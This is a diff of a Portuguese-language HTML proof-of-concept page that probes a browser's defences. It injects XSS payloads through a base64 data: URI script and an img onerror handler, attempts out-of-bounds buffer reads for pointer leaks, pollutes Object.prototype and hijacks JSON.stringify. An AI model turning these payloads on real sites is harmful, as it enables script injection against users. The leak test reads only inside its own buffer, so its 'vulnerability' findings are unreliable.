@@ -2,22 +2,14 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PP Hijack JSON + Canvas Exploração FINAL (v8)</title> <style>
-        /* Estilos CSS (Sem alterações da v7) */
+    <title>PP Hijack JSON + Canvas Exploração MÁXIMA (v9)</title>
+    <style>
+        /* Estilos CSS (Sem alterações da v8) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output { background: #222; border: 1px solid #444; padding: 10px; height: 60vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        .log-info { color: #6cf; }
-        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
-        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
-        .log-vuln { color: #ff4444; font-weight: bold; }
-        .log-good { color: #4CAF50; }
-        .log-warn { color: #FFC107; }
-        .log-error { color: #f44336; }
-        .log-critical { color: #f0f; font-weight: bold; }
-        .log-leak { color: #FF9800; font-weight: bold; }
-        .log-ptr { color: #f0f; font-weight: bold; }
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
         #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 40px; }
-        #output-canvas { background: #2a2a2a; border: 1px solid #444; padding: 10px; height: 55vh; /* Aumentado altura */ overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        #output-canvas { background: #2a2a2a; border: 1px solid #444; padding: 10px; height: 60vh; /* Aumentado altura */ overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
         #interactive-canvas { display: block; border: 1px solid #444; margin-top: 5px; background-color: #333; }
         #canvas-coord-status { color: #aaa; font-size: 12px; height: 15px; }
         hr { border: 1px solid #555; margin: 20px 0; }
@@ -33,8 +25,8 @@
     <hr>
 
     <section>
-        <h2>Teste de Canvas (Exploração FINAL + Interatividade v8)</h2>
-        <p>Testes: Robustez, Stress, PP, WebGL, Outras APIs, SVG, Hover/Click, Leitura Leak S1.</p>
+        <h2>Teste de Canvas (Exploração MÁXIMA + Interatividade v9)</h2>
+        <p>Testes: Robustez, Stress, PP Completo, WebGL, Worker, WebSocket, Outras APIs, SVG, Hover/Click, Leitura Leak S1.</p>
         <canvas id="interactive-canvas" width="350" height="200"></canvas>
         <div id="canvas-coord-status">Passe o mouse sobre o canvas ↑</div>
         <button id="runCanvasBtn" onclick="runCanvasTest()">Iniciar Teste de Canvas (Script 2)</button>
@@ -43,249 +35,81 @@
 
     <script>
         // --- Script 1 Original Inteiro ---
-        // ... (Código completo do Script 1 exatamente como antes) ...
-        const outputDiv = document.getElementById('output');
-        const runBtn = document.getElementById('runBtn');
-        const SHORT_PAUSE = 50; // ms
-        const MEDIUM_PAUSE = 500; // ms
-        let leakedValueFromOOB = null; // Armazena valor do Info Leak (GLOBAL)
-
-        const log = (message, type = 'info') => {
-            if (!outputDiv) return;
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                if(outputDiv.innerHTML.length > 500000){
-                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000);
-                    outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML;
-                }
-                outputDiv.innerHTML += `<span class="log-${type}">${timestamp} ${sanitizedMessage}\n</span>`;
-                outputDiv.scrollTop = outputDiv.scrollHeight;
-            } catch(e) { console.error("Erro na função log:", e); outputDiv = null; }
-        };
-
-        const toHex = (val, bits = 32) => { // Definido GLOBALMENTE aqui
-            if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
-            let num = Number(val);
-            if (bits <= 32) { num = num >>> 0; }
-            const pad = Math.ceil(bits / 4);
-            return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
-        }
-
-        const isPotentialPointer64 = (high, low) => {
-            if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
-            if (high === 0 && low === 0) return false;
-            if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false;
-            if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false;
-            if (high === 0 && low < 0x100000) return false;
-            return true;
-        };
-
-         const isPotentialData32 = (val) => {
-             if (val === null || typeof val !== 'number') return false;
-             val = val >>> 0;
-             if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false;
-             if (val < 0x1000) return false;
-             return true;
-         }
-
-        const testCSPBypass = async () => {
-            log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test');
-            log("Tentando XSS via data: URI (alert)...", 'subtest');
-            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-            try {
-                const payloadJS = `try { alert('XSS via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`;
-                const encodedPayload = btoa(payloadJS);
-                const scriptTag = document.createElement('script');
-                scriptTag.src = 'data:text/javascript;base64,' + encodedPayload;
-                scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI!", 'error'); };
-                document.body.appendChild(scriptTag);
-                log("Tag <script> data: URI adicionada.", 'info');
-            } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); }
-            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2));
-            log("Tentando XSS DOM via inline handler (onerror)...", 'subtest');
-            await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-            try {
-                const imgTag = document.createElement('img');
-                imgTag.src = 'invalid_image_source_' + Date.now();
-                const onerrorPayload = `
-                    try {
-                        const target = document.getElementById('xss-target-div');
-                        if (target) {
-                            target.innerHTML = '<h2 class="log-vuln">XSS DOM via ONERROR Executado!</h2>';
-                            log("XSS DOM via onerror realizado!", "vuln");
-                        } else { log("Alvo XSS DOM (onerror) não encontrado.", "error"); }
-                        alert('XSS_DOM_ONERROR');
-                    } catch(e) { log("Erro no payload onerror: " + e.message, "warn"); }
-                `;
-                imgTag.setAttribute('onerror', onerrorPayload);
-                document.body.appendChild(imgTag);
-                log("Tag <img> com onerror adicionada.", 'info');
-            } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error'); }
-            log("--- Teste 1 Concluído (Verificar alertas/DOM) ---", 'test');
-        };
-
-        const testOOBReadInfoLeakEnhancedStore = async () => {
-            log("--- Iniciando Teste 2: OOB Write/Read Extensivo (Info Leak Aprimorado) ---", 'test');
-            const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = 32;
-            const oobReadOffsets = []; for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); }
-            let writeSuccess = false; let potentialLeakFoundCount = 0; leakedValueFromOOB = null; // Reseta antes de tentar
-            try {
-                const buffer = new ArrayBuffer(bufferSize + 256); const dataView = new DataView(buffer); const baseOffset = 128;
-                for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); }
-                const writeTargetAddress = baseOffset + oobWriteOffset;
-                log(`Tentando escrita OOB U8 @${oobWriteOffset}...`, 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln'); writeSuccess = true;
-                } catch (e) { log(`BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'good'); log("--- Teste 2 Interrompido (Escrita OOB falhou) ---", 'test'); return false; }
-                await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE));
-                log(`Tentando leituras OOB U32/U64 em ${oobReadOffsets.length} offsets...`, 'subtest');
-                for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffset + readOffset; if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue;
-                    try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64(high, low)) { const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`; log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr'); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset }; log(`  -> VALOR U64 ARMAZENADO (offset ${readOffset}).`, 'vuln'); } }
-                    } catch (e) {/* Ignora */}
-                    if (leakedValueFromOOB === null && readTargetAddress + 4 <= buffer.byteLength ) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32(val32)) { log(`  -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak'); potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset }; log(`  -> VALOR U32 ARMAZENADO (offset ${readOffset}).`, 'vuln'); } } catch (e) {/* Ignora */} }
-                    if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1)); }
-            } catch (e) { log(`Erro inesperado durante o teste Info Leak: ${e.message}`, 'error'); }
-            log(`--- Teste 2 Concluído (${potentialLeakFoundCount} potenciais leaks, ${leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} armazenado do offset ${leakedValueFromOOB.offset}` : 'nenhum valor armazenado'}) ---`, 'test');
-            return writeSuccess;
-        };
-
-        const testBasicPP = async () => {
-            log("--- Iniciando Teste 3: Prototype Pollution (Básica) ---", 'test');
-            const testProp = '__pp_basic_test__'; const testValue = 'Polluted!'; let success = false;
-            try { log(`Poluindo Object.prototype.${testProp} = "${testValue}"`, 'subtest'); Object.prototype[testProp] = testValue; log("Verificando herança em objeto vazio {}...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const obj = {}; if (obj[testProp] === testValue) { log(`VULN: PP Básica confirmada! Objeto vazio herdou a propriedade.`, 'vuln'); success = true; } else { log(`FALHA: PP Básica não confirmada. Objeto vazio NÃO herdou a propriedade.`, 'good'); } } catch (e) { log(`Erro durante teste PP Básico: ${e.message}`, 'error'); }
-            finally { try { delete Object.prototype[testProp]; } catch(e){} log(`Limpeza de Object.prototype.${testProp} realizada.`, 'info'); }
-            log(`--- Teste 3 Concluído (PP Básica ${success ? 'Confirmada' : 'Falhou'}) ---`, 'test');
-            return success;
-        };
-
-        const testPPJsonHijack = async () => {
-            log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test');
-            const originalStringify = JSON.stringify; let hijackSuccessful = false; let interactionSuccessful = false; let hijackReturnedCorrectly = false;
-            try { log("Tentando sobrescrever JSON.stringify...", 'subtest'); JSON.stringify = function hijackedStringify(value, replacer, space) { log("===> VULN: DENTRO DA FUNÇÃO JSON.stringify SEQUESTRADA! <===", 'vuln'); hijackSuccessful = true; log(`  -> Hijack: Tentando aceder ao valor vazado do Teste 2...`, 'info'); try { const leak = leakedValueFromOOB; let leakStr = "NULO"; if (leak) { leakStr = leak.type === 'U64' ? `U64 H=${toHex(leak.high)} L=${toHex(leak.low)}` : `U32 ${toHex(leak.low)}`; interactionSuccessful = true; } log(`  -> Hijack: Valor armazenado de OOB Read (Teste 2) é: ${leakStr}`, 'leak'); } catch(interactionError) { log(`  -> Hijack: Erro ao aceder/logar valor vazado: ${interactionError.message}`, 'error'); } return '{"hijacked": true, "original_value": "???", "leak_accessed": ' + interactionSuccessful + '}'; };
-                log("Testando a função JSON.stringify sequestrada com {a: 1, b: 'teste'}...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const testObject = { a: 1, b: 'teste' }; log(`Objeto original: ${originalStringify(testObject)}`, 'info'); const result = JSON.stringify(testObject); log(`Resultado retornado por JSON.stringify(): ${result}`, 'info');
-                if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada confirmado!", 'vuln'); hijackReturnedCorrectly = true; } else if (hijackSuccessful) { log("AVISO: Função JSON.stringify foi sequestrada, mas o retorno não foi o esperado.", 'warn'); } else { log("FALHA: Sequestro de JSON.stringify não funcionou.", 'good'); }
-            } catch (e) { log(`Erro durante teste PP Hijack JSON: ${e.message}`, 'error'); }
-            finally { JSON.stringify = originalStringify; log("Função JSON.stringify restaurada.", 'info'); if (JSON.stringify === originalStringify) { log("Restauração de stringify confirmada.", 'info'); } else { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'error'); } }
-            log(`--- Teste 4 Concluído (PP Hijack JSON ${hijackReturnedCorrectly ? 'Confirmado' : 'Falhou'}) ---`, 'test');
-            return hijackReturnedCorrectly;
-        };
-
-        // --- Função Principal para Rodar Todos os Testes (Original) ---
-        const runAllTests = async () => {
-            if (runBtn) runBtn.disabled = true;
-            log("==== INICIANDO PoC Final v9 (PP Hijack JSON) ====", 'test');
-            await testCSPBypass(); // Teste 1
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            await testOOBReadInfoLeakEnhancedStore(); // Teste 2
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            await testBasicPP(); // Teste 3
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            await testPPJsonHijack(); // Teste 4
-            await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE));
-            log("\n==== PoC Final v9 CONCLUÍDA ====", 'test');
-            if (runBtn) runBtn.disabled = false;
-        };
-        // --- FIM DO SCRIPT 1 ORIGINAL ---
+        // ... (Código completo e intocado do Script 1 aqui) ...
+        const outputDiv = document.getElementById('output'); const runBtn = document.getElementById('runBtn'); const SHORT_PAUSE = 50; const MEDIUM_PAUSE = 500; let leakedValueFromOOB = null; const log = (message, type = 'info') => { if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); if(outputDiv.innerHTML.length > 500000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 250000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${type}">${timestamp} ${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); outputDiv = null; } }; const toHex = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); }; const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; }; const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; }; const testCSPBypass = async () => { log("--- Iniciando Teste 1: CSP Bypass / XSS ---", 'test'); log("Tentando XSS via data: URI (alert)...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { const payloadJS = `try { alert('XSS via Data URI!'); log("[Payload Data:] Alerta data: URI executado!", "vuln"); } catch(e) { log("[Payload Data:] Alerta data: URI bloqueado: " + e.message, "good"); }`; const encodedPayload = btoa(payloadJS); const scriptTag = document.createElement('script'); scriptTag.src = 'data:text/javascript;base64,' + encodedPayload; scriptTag.onerror = () => { log("ERRO: Falha ao carregar script data: URI!", 'error'); }; document.body.appendChild(scriptTag); log("Tag <script> data: URI adicionada.", 'info'); } catch (e) { log(`Erro ao criar/adicionar script data: URI: ${e.message}`, 'error'); } await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE * 2)); log("Tentando XSS DOM via inline handler (onerror)...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { const imgTag = document.createElement('img'); imgTag.src = 'invalid_image_source_' + Date.now(); const onerrorPayload = ` try { const target = document.getElementById('xss-target-div'); if (target) { target.innerHTML = '<h2 class="log-vuln">XSS DOM via ONERROR Executado!</h2>'; log("XSS DOM via onerror realizado!", "vuln"); } else { log("Alvo XSS DOM (onerror) não encontrado.", "error"); } alert('XSS_DOM_ONERROR'); } catch(e) { log("Erro no payload onerror: " + e.message, "warn"); } `; imgTag.setAttribute('onerror', onerrorPayload); document.body.appendChild(imgTag); log("Tag <img> com onerror adicionada.", 'info'); } catch (e) { log(`Erro ao criar/adicionar img onerror: ${e.message}`, 'error'); } log("--- Teste 1 Concluído (Verificar alertas/DOM) ---", 'test'); }; const testOOBReadInfoLeakEnhancedStore = async () => { log("--- Iniciando Teste 2: OOB Write/Read Extensivo (Info Leak Aprimorado) ---", 'test'); const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = 32; const oobReadOffsets = []; for (let i = -64; i < bufferSize + 64; i += 4) { oobReadOffsets.push(i); } let writeSuccess = false; let potentialLeakFoundCount = 0; leakedValueFromOOB = null; try { const buffer = new ArrayBuffer(bufferSize + 256); const dataView = new DataView(buffer); const baseOffset = 128; for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } const writeTargetAddress = baseOffset + oobWriteOffset; log(`Tentando escrita OOB U8 @${oobWriteOffset}...`, 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} permitida!`, 'vuln'); writeSuccess = true; } catch (e) { log(`BLOQUEADO: Escrita OOB U8 @${oobWriteOffset} impedida: ${e.message}`, 'good'); log("--- Teste 2 Interrompido (Escrita OOB falhou) ---", 'test'); return false; } await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); log(`Tentando leituras OOB U32/U64 em ${oobReadOffsets.length} offsets...`, 'subtest'); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffset + readOffset; if (readTargetAddress < 0 || readTargetAddress + 8 > buffer.byteLength) continue; try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64(high, low)) { const valueStr = `H=${toHex(high, 32)} L=${toHex(low, 32)}`; log(`  -> POTENCIAL PONTEIRO? U64 @${readOffset}: ${valueStr}`, 'ptr'); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset }; log(`  -> VALOR U64 ARMAZENADO (offset ${readOffset}).`, 'vuln'); } } } catch (e) {/* Ignora */} if (leakedValueFromOOB === null && readTargetAddress + 4 <= buffer.byteLength ) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32(val32)) { log(`  -> Leak U32? @${readOffset}: ${toHex(val32, 32)}`, 'leak'); potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset }; log(`  -> VALOR U32 ARMAZENADO (offset ${readOffset}).`, 'vuln'); } } catch (e) {/* Ignora */} } if (readOffset % 32 === 0) await new Promise(resolve => setTimeout(resolve, 1)); } } catch (e) { log(`Erro inesperado durante o teste Info Leak: ${e.message}`, 'error'); } log(`--- Teste 2 Concluído (${potentialLeakFoundCount} potenciais leaks, ${leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} armazenado do offset ${leakedValueFromOOB.offset}` : 'nenhum valor armazenado'}) ---`, 'test'); return writeSuccess; }; const testBasicPP = async () => { log("--- Iniciando Teste 3: Prototype Pollution (Básica) ---", 'test'); const testProp = '__pp_basic_test__'; const testValue = 'Polluted!'; let success = false; try { log(`Poluindo Object.prototype.${testProp} = "${testValue}"`, 'subtest'); Object.prototype[testProp] = testValue; log("Verificando herança em objeto vazio {}...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const obj = {}; if (obj[testProp] === testValue) { log(`VULN: PP Básica confirmada! Objeto vazio herdou a propriedade.`, 'vuln'); success = true; } else { log(`FALHA: PP Básica não confirmada. Objeto vazio NÃO herdou a propriedade.`, 'good'); } } catch (e) { log(`Erro durante teste PP Básico: ${e.message}`, 'error'); } finally { try { delete Object.prototype[testProp]; } catch(e){} log(`Limpeza de Object.prototype.${testProp} realizada.`, 'info'); } log(`--- Teste 3 Concluído (PP Básica ${success ? 'Confirmada' : 'Falhou'}) ---`, 'test'); return success; }; const testPPJsonHijack = async () => { log("--- Iniciando Teste 4: PP Hijack (JSON.stringify) ---", 'test'); const originalStringify = JSON.stringify; let hijackSuccessful = false; let interactionSuccessful = false; let hijackReturnedCorrectly = false; try { log("Tentando sobrescrever JSON.stringify...", 'subtest'); JSON.stringify = function hijackedStringify(value, replacer, space) { log("===> VULN: DENTRO DA FUNÇÃO JSON.stringify SEQUESTRADA! <===", 'vuln'); hijackSuccessful = true; log(`  -> Hijack: Tentando aceder ao valor vazado do Teste 2...`, 'info'); try { const leak = leakedValueFromOOB; let leakStr = "NULO"; if (leak) { leakStr = leak.type === 'U64' ? `U64 H=${toHex(leak.high)} L=${toHex(leak.low)}` : `U32 ${toHex(leak.low)}`; interactionSuccessful = true; } log(`  -> Hijack: Valor armazenado de OOB Read (Teste 2) é: ${leakStr}`, 'leak'); } catch(interactionError) { log(`  -> Hijack: Erro ao aceder/logar valor vazado: ${interactionError.message}`, 'error'); } return '{"hijacked": true, "original_value": "???", "leak_accessed": ' + interactionSuccessful + '}'; }; log("Testando a função JSON.stringify sequestrada com {a: 1, b: 'teste'}...", 'subtest'); await new Promise(resolve => setTimeout(resolve, SHORT_PAUSE)); const testObject = { a: 1, b: 'teste' }; log(`Objeto original: ${originalStringify(testObject)}`, 'info'); const result = JSON.stringify(testObject); log(`Resultado retornado por JSON.stringify(): ${result}`, 'info'); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada confirmado!", 'vuln'); hijackReturnedCorrectly = true; } else if (hijackSuccessful) { log("AVISO: Função JSON.stringify foi sequestrada, mas o retorno não foi o esperado.", 'warn'); } else { log("FALHA: Sequestro de JSON.stringify não funcionou.", 'good'); } } catch (e) { log(`Erro durante teste PP Hijack JSON: ${e.message}`, 'error'); } finally { JSON.stringify = originalStringify; log("Função JSON.stringify restaurada.", 'info'); if (JSON.stringify === originalStringify) { log("Restauração de stringify confirmada.", 'info'); } else { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'error'); } } log(`--- Teste 4 Concluído (PP Hijack JSON ${hijackReturnedCorrectly ? 'Confirmado' : 'Falhou'}) ---`, 'test'); return hijackReturnedCorrectly; }; const runAllTests = async () => { if (runBtn) runBtn.disabled = true; log("==== INICIANDO PoC Final v9 (PP Hijack JSON) ====", 'test'); await testCSPBypass(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testOOBReadInfoLeakEnhancedStore(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testBasicPP(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); await testPPJsonHijack(); await new Promise(resolve => setTimeout(resolve, MEDIUM_PAUSE)); log("\n==== PoC Final v9 CONCLUÍDA ====", 'test'); if (runBtn) runBtn.disabled = false; };
     </script>
 
     <script>
         // --- Script 2: Variáveis e constantes ---
-        const SHORT_PAUSE_CANVAS_FINAL = 50; // Renomeado
-        let canvasClickListenerCanvas_final = null; // Renomeado
-        let canvasMoveListenerCanvas_final = null;  // Renomeado
-        let currentHoverTarget_final = null; // Renomeado
-        let hijackActive_final = false; // Renomeado
+        const SHORT_PAUSE_CANVAS_FINAL = 50;
+        let canvasClickListenerCanvas_final = null;
+        let canvasMoveListenerCanvas_final = null;
+        let currentHoverTarget_final = null;
+        let hijackActive_final = false;
 
-        const interactiveAreas_final = [ // Renomeado
+        const interactiveAreas_final = [
             { id: 'rect-log', x: 10, y: 10, w: 80, h: 30, color: '#FF5733', hoverColor: '#FF8C66', text: 'Log Click' },
             { id: 'rect-link', x: 100, y: 10, w: 80, h: 30, color: '#337BFF', hoverColor: '#66A3FF', text: 'Abrir Link' },
             { id: 'rect-rerun', x: 190, y: 10, w: 100, h: 30, color: '#4CAF50', hoverColor: '#80C883', text: 'Re-ler Leak S1' }
         ];
+        let currentLeakData_final = { text: "Leak(S1): N/A", color: "#AAAAAA" }; // Armazena info do leak para redraw
 
         // --- Função de Log (Script 2) ---
-        const logCanvas_final = (outputDivElement, message, type = 'info') => { // Renomeado
-            const logMsg = `[CANVAS-${type.toUpperCase()}] ${message}`;
-            console.log(logMsg); // Log console sempre
-            if (!outputDivElement) { console.error("logCanvas_final ERRO: Output DIV nulo!"); return; }
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                 if(outputDivElement.innerHTML.length > 750000){ // Aumentado limite um pouco
-                    outputDivElement.innerHTML = outputDivElement.innerHTML.substring(outputDivElement.innerHTML.length - 350000);
-                    outputDivElement.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDivElement.innerHTML;
-                 }
-                const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical'].includes(type) ? type : 'info';
-                outputDivElement.innerHTML += `<span class="log-${logClass}">${timestamp} ${sanitizedMessage}\n</span>`;
-                outputDivElement.scrollTop = outputDivElement.scrollHeight;
-            } catch(e) { console.error("logCanvas_final ERRO ao escrever no DIV:", e); }
-        };
+        const logCanvas_final = (outputDivElement, message, type = 'info') => { /* ... (igual v8) ... */ const logMsg = `[CANVAS-${type.toUpperCase()}] ${message}`; console.log(logMsg); if (!outputDivElement) { console.error("logCanvas_final ERRO: Output DIV nulo!"); return; } try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); if(outputDivElement.innerHTML.length > 750000){ outputDivElement.innerHTML = outputDivElement.innerHTML.substring(outputDivElement.innerHTML.length - 350000); outputDivElement.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDivElement.innerHTML; } const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical'].includes(type) ? type : 'info'; outputDivElement.innerHTML += `<span class="log-${logClass}">${timestamp} ${sanitizedMessage}\n</span>`; outputDivElement.scrollTop = outputDivElement.scrollHeight; } catch(e) { console.error("logCanvas_final ERRO ao escrever no DIV:", e); }};
 
         // --- Helper toHex (Comentado) ---
-        // Usa toHex do Script 1
 
         // --- Desenho das Áreas Interativas ---
-        const drawInteractiveAreas_final = (ctx, canvasEl, outputDivEl) => { // Renomeado
-             const localLog = (msg, type) => logCanvas_final(outputDivEl, msg, type); // Usa log renomeado
-             if (!ctx || !canvasEl) return;
-             try {
-                interactiveAreas_final.forEach(area => { // Usa array renomeado
-                    ctx.fillStyle = (currentHoverTarget_final === area.id) ? area.hoverColor : area.color; // Usa var global renomeada
-                    ctx.fillRect(area.x, area.y, area.w, area.h);
-                    ctx.fillStyle = "#FFFFFF"; ctx.font = "bold 12px monospace";
-                    ctx.textAlign = "center"; ctx.fillText(area.text, area.x + area.w / 2, area.y + area.h / 2 + 4);
-                });
-                ctx.textAlign = "start";
-             } catch(e) { localLog(`Erro ao desenhar áreas interativas: ${e.message}`, 'error'); }
-        };
+        const drawInteractiveAreas_final = (ctx, canvasEl, outputDivEl) => { /* ... (igual v8) ... */ const localLog = (msg, type) => logCanvas_final(outputDivEl, msg, type); if (!ctx || !canvasEl) return; try { interactiveAreas_final.forEach(area => { ctx.fillStyle = (currentHoverTarget_final === area.id) ? area.hoverColor : area.color; ctx.fillRect(area.x, area.y, area.w, area.h); ctx.fillStyle = "#FFFFFF"; ctx.font = "bold 12px monospace"; ctx.textAlign = "center"; ctx.fillText(area.text, area.x + area.w / 2, area.y + area.h / 2 + 4); }); ctx.textAlign = "start"; } catch(e) { localLog(`Erro ao desenhar áreas interativas: ${e.message}`, 'error'); }};
 
-        // --- Função Principal do Teste de Canvas (Final) ---
-        const testComprehensiveCanvasFinal = async (canvasEl, outputDivEl, coordStatusDivEl, runBtnEl) => { // Renomeado
-            let ctx_final = null; // Renomeado
-            const localLog = (msg, type = 'info') => logCanvas_final(outputDivEl, msg, type); // Usa log renomeado
-            const PAUSE = () => new Promise(r => setTimeout(r, SHORT_PAUSE_CANVAS_FINAL)); // Usa constante renomeada
+        // --- Função Principal do Teste de Canvas (Final v9) ---
+        const testComprehensiveCanvasFinalV9 = async (canvasEl, outputDivEl, coordStatusDivEl, runBtnEl) => {
+            let ctx_final = null;
+            const localLog = (msg, type = 'info') => logCanvas_final(outputDivEl, msg, type);
+            const PAUSE = (ms = SHORT_PAUSE_CANVAS_FINAL) => new Promise(r => setTimeout(r, ms)); // Helper de pausa
 
-            hijackActive_final = false; // Reseta flags
+            hijackActive_final = false;
             currentHoverTarget_final = null;
+            currentLeakData_final = { text: "Leak(S1): N/A", color: "#AAAAAA" }; // Reseta info do leak
 
-            localLog("--- Iniciando Teste Final Canvas (Exploração Total) ---", 'test');
+            localLog("--- Iniciando Teste FINAL Canvas v9 (Exploração Total) ---", 'test');
             try {
                 // 1. Setup Básico
